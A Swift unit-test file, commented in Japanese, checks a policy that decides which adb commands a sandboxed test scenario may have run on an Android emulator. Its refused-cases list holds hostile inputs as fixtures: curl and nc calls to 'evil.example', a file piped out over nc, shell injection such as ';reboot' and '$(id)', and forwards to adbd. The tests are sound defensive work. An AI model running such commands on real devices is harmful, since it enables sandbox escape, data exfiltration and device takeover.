// `AdbPolicy` は「親が子の代わりに実行してよい adb の形」の唯一の定義元。ここが緩むと、サンドボックスの中の
// シナリオが `adb shell` で Emulator の中 = 枠の外から外部へ出られ、繋がった全 Android 端末を操作できる。

import XCTest
@testable import FTCore

final class AdbPolicyTests: XCTestCase {

    private var root: URL!

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory
            .appendingPathComponent("ft-adb-policy-\(UUID().uuidString)", isDirectory: true)
        for sub in ["tool/AndroidRunner/prebuilt", "writable"] {
            try FileManager.default.createDirectory(at: root.appendingPathComponent(sub), withIntermediateDirectories: true)
        }
    }

    override func tearDown() { try? FileManager.default.removeItem(at: root) }

    private func path(_ sub: String) -> String { root.appendingPathComponent(sub).path }

    private var context: SimctlPolicy.Context {
        SimctlPolicy.Context(udid: nil, deviceName: nil, toolRoots: [path("tool")],
                             childWritableRoots: [ScenarioSandbox.canonicalPath(path("writable"))],
                             serial: "emulator-5554", adbPath: "/parent/platform-tools/adb",
                             bundletool: ["/parent/bin/bundletool"])
    }

    private func refusal(_ args: [String], context: SimctlPolicy.Context? = nil) -> String? {
        AdbPolicy.check(args, context: context ?? self.context)?.reason
    }

    private func lane(_ args: String...) -> [String] { ["-s", "emulator-5554"] + args }

    func testTheShapesTheDriverUsesAreAllowed() {
        let allowed: [[String]] = [
            lane("shell", "true"), lane("shell", "wm", "density"), lane("shell", "dumpsys", "window", "windows"),
            lane("shell", "pm", "clear", "com.ftester.e2e"), lane("shell", "am", "force-stop", "com.example.ftbridge"),
            lane("shell", "monkey", "-p", "com.ftester.e2e", "-c", "android.intent.category.LAUNCHER", "1"),
            lane("shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", "'fte2e://screen/detail?a=1&b=2'"),
            lane("shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", "'https://x.example'", "com.ftester.e2e"),
            lane("shell", "input", "keyevent", "KEYCODE_HOME"), lane("shell", "input", "keyevent", "66"),
            lane("shell", "input", "swipe", "10", "-20", "300", "400", "500"),
            lane("shell", "settings", "put", "system", "user_rotation", "1"),
            lane("shell", "settings", "put", "global", "window_animation_scale", "0"),
            lane("shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"),
            lane("shell", "pidof", "com.ftester.e2e"),
            lane("shell", "am instrument -w -e port 8123 -e ttl 3600 -e owner '/Users/me/my repo' -e timing 1 "
                 + "com.example.ftbridge/.BridgeInstrumentation </dev/null >/data/local/tmp/ftbridge-instrument.log 2>&1 &"),
            lane("shell", "pidof com.ftester.e2e; echo --ft-sockets--; cat /proc/net/unix | grep devtools_remote"),
            lane("shell", "getprop ro.debuggable; echo --ft-debuggable--; dumpsys package com.ftester.e2e | grep flags="),
            lane("forward", "tcp:0", "tcp:8123"), lane("forward", "--list"), lane("forward", "--remove", "tcp:12345"),
            lane("forward", "tcp:12345", "localabstract:webview_devtools_remote_4242"),
            lane("forward", "tcp:12345", "localabstract:chrome_devtools_remote"),
            lane("install", "-r", path("tool/AndroidRunner/prebuilt/ftbridge.apk")),
            lane("uninstall", "com.ftester.e2e"), lane("get-serialno"), lane("get-state"),
            lane("logcat", "-d", "-b", "crash"), lane("logcat", "-d", "-b", "crash", "-t", "2026-10-06 12:34:56.789"),
            lane("logcat", "-d", "-b", "main", "-b", "crash", "-t", "2026-10-06 12:34:56.789", "--pid", "4242"),
            ["devices"],
        ]
        for args in allowed {
            XCTAssertNil(refusal(args), args.joined(separator: " "))
        }
    }

    /// 枠の外でコマンドを起こす・他の端末へ届く・枠の中で作った物を入れる形は断る
    func testShapesThatEscapeTheSandboxAreRefused() {
        let refused: [[String]] = [
            lane("shell", "id"), lane("shell", "sh", "-c", "curl https://evil.example"),
            lane("shell", "toybox nc evil.example 80 < /sdcard/x"),
            lane("shell", "pm", "clear", "x;reboot"), lane("shell", "am", "force-stop", "com.x $(id)"),
            lane("shell", "pidof", "com.x|sh"), lane("uninstall", "-k com.x"),
            lane("shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", "'a'; reboot; echo '"),
            lane("shell", "am", "start", "-W", "-a", "android.intent.action.VIEW", "-d", "https://unquoted"),
            lane("shell", "am instrument -w -e port 8123 -e ttl 1 -e owner '/x'; reboot; echo '' "
                 + "com.example.ftbridge/.BridgeInstrumentation </dev/null >/data/local/tmp/ftbridge-instrument.log 2>&1 &"),
            lane("shell", "am instrument -w -e port 8123 -e ttl 1 com.example.ftbridge/.BridgeInstrumentation "
                 + "</dev/null >/data/local/tmp/ftbridge-instrument.log 2>&1 &\nreboot"),
            lane("shell", "pidof com.x; reboot; echo --ft-sockets--; cat /proc/net/unix | grep devtools_remote"),
            lane("shell", "settings", "put", "global", "verifier_verify_adb_installs", "1;reboot"),
            lane("shell", "settings", "put", "global", "adb_enabled", "0"),
            lane("shell", "input", "text", "hello"), lane("shell", "input", "keyevent", "KEYCODE_POWER"),
            lane("forward", "tcp:12345", "tcp:5555"), lane("forward", "tcp:12345", "localabstract:adbd"),
            lane("reverse", "tcp:8080", "tcp:8080"), lane("push", "/tmp/x", "/sdcard/x"), lane("pull", "/sdcard/x", "/tmp/x"),
            lane("install", "-r", path("writable/evil.apk")), lane("install", "relative.apk"),
            lane("emu", "kill"), lane("reboot"), lane("root"), lane("tcpip", "5555"),
            lane("exec-out", "screencap", "-p"), lane("logcat"), lane("logcat", "-d", "-b", "crash", "-t", "1; reboot"),
            ["-s", "emulator-5556", "shell", "true"],
            ["shell", "true"],
            ["connect", "192.168.0.10:5555"], ["kill-server"], [],
        ]
        for args in refused {
            XCTAssertNotNil(refusal(args), args.joined(separator: " "))
        }
    }

    /// serial を持たない run(端末を問わない)では `-s` 無しも通す(その端末しか繋がっていない前提)
    func testRunsWithoutASerialAcceptAnyDeviceButStillCheckTheShape() {
        var anyDevice = context
        anyDevice.serial = nil
        XCTAssertNil(refusal(["shell", "true"], context: anyDevice))
        XCTAssertNil(refusal(["-s", "emulator-5556", "shell", "true"], context: anyDevice))
        XCTAssertNotNil(refusal(["shell", "id"], context: anyDevice))
    }

    func testTheParentRunsItsOwnAdbNotThePathTheChildSent() {
        let argv = ["/tmp/evil/adb", "-s", "emulator-5554", "shell", "true"]
        XCTAssertEqual(BrokerPolicy.executableArgv(argv, context: context),
                       ["/parent/platform-tools/adb", "-s", "emulator-5554", "shell", "true"])
        XCTAssertNil(BrokerPolicy.check(argv, context: context))
        var noAdb = context
        noAdb.adbPath = nil
        XCTAssertNil(BrokerPolicy.executableArgv(argv, context: noAdb))
        XCTAssertNotNil(BrokerPolicy.check(argv, context: noAdb))
        XCTAssertNotNil(BrokerPolicy.check(["ANDROID_SERIAL=x"] + argv, context: context), "環境変数は受けない")
        XCTAssertEqual(BrokerPolicy.executableArgv(["xcrun", "simctl", "list"], context: context),
                       ["xcrun", "simctl", "list"])
    }

    func testThePackageNameGrammar() {
        for name in ["com.ftester.e2e", "android", "jp.Co_2.x"] { XCTAssertTrue(AndroidPackageNameGrammar.isShellSafe(name), name) }
        for name in ["", "x;reboot", "a b", "-p", ".x", "1x", "a-b", "com.x\n"] {
            XCTAssertFalse(AndroidPackageNameGrammar.isShellSafe(name), name.debugDescription)
        }
    }

    // MARK: - bundletool(.apks のインストール)

    /// 枠の中では bundletool が adb サーバへ繋げないので親が代行する。親自身の bundletool と adb で実行し、
    /// 入れる .apks・端末は表で縛る
    func testBundletoolInstallIsRunByTheParentWithItsOwnToolsAndChecked() {
        let apks = path("tool/app.apks")
        let child = ["/child/bundletool", "install-apks", "--apks=\(apks)", "--adb=/child/adb", "--device-id=emulator-5554"]
        XCTAssertNil(BrokerPolicy.check(child, context: context))
        XCTAssertEqual(BrokerPolicy.executableArgv(child, context: context),
                       ["/parent/bin/bundletool", "install-apks", "--apks=\(apks)",
                        "--adb=/parent/platform-tools/adb", "--device-id=emulator-5554"])
        let jar = ["java", "-jar", "/child/bundletool.jar", "install-apks", "--apks=\(apks)", "--adb=/x",
                   "--device-id=emulator-5554"]
        XCTAssertNil(BrokerPolicy.check(jar, context: context))
        XCTAssertEqual(BrokerPolicy.executableArgv(jar, context: context)?.first, "/parent/bin/bundletool")

        let refused: [[String]] = [
            ["/b/bundletool", "install-apks", "--apks=\(path("writable/evil.apks"))", "--adb=/x", "--device-id=emulator-5554"],
            ["/b/bundletool", "install-apks", "--apks=relative.apks", "--adb=/x", "--device-id=emulator-5554"],
            ["/b/bundletool", "install-apks", "--apks=\(apks)", "--adb=/x", "--device-id=emulator-5556"],
            ["/b/bundletool", "install-apks", "--apks=\(apks)", "--adb=/x"],
            ["/b/bundletool", "build-apks", "--bundle=/x.aab", "--output=/tmp/y.apks"],
            ["/b/bundletool", "install-apks", "--apks=\(apks)", "--adb=/x", "--device-id=emulator-5554", "--allow-downgrade"],
        ]
        for argv in refused {
            XCTAssertNotNil(BrokerPolicy.check(argv, context: context), argv.joined(separator: " "))
        }
        var noTool = context
        noTool.bundletool = nil
        XCTAssertNotNil(BrokerPolicy.check(child, context: noTool))
        XCTAssertNil(BrokerPolicy.executableArgv(child, context: noTool))
    }

    // MARK: - broker 越し(子 → 親の往復)

    private final class Recorder: @unchecked Sendable {
        private let lock = NSLock()
        private var calls: [[String]] = []
        func record(_ argv: [String]) { lock.lock(); calls.append(argv); lock.unlock() }
        var all: [[String]] { lock.lock(); defer { lock.unlock() }; return calls }
    }

    func testTheGatewayForwardsAdbAndTheParentRunsItWithItsOwnAdb() throws {
        let recorder = Recorder()
        let broker = try SandboxBroker(context: context, directory: NSTemporaryDirectory(),
                                       execute: { argv, _, _ in recorder.record(argv); return (0, Data("ok".utf8)) })
        defer { broker.stop() }
        let allowed = try XCTUnwrap(SandboxGateway.forward(
            ["/child/adb", "-s", "emulator-5554", "shell", "wm", "density"], timeout: 3, stdin: nil,
            socketPath: broker.socketPath))
        XCTAssertEqual(allowed.0, 0)
        let refused = try XCTUnwrap(SandboxGateway.forward(
            ["/child/adb", "-s", "emulator-5554", "shell", "id"], timeout: 3, stdin: nil, socketPath: broker.socketPath))
        XCTAssertEqual(refused.0, SandboxGateway.refusedStatus)
        XCTAssertTrue(String(decoding: refused.1, as: UTF8.self).contains("not allowed"))
        XCTAssertEqual(recorder.all, [["/parent/platform-tools/adb", "-s", "emulator-5554", "shell", "wm", "density"]])
    }
}
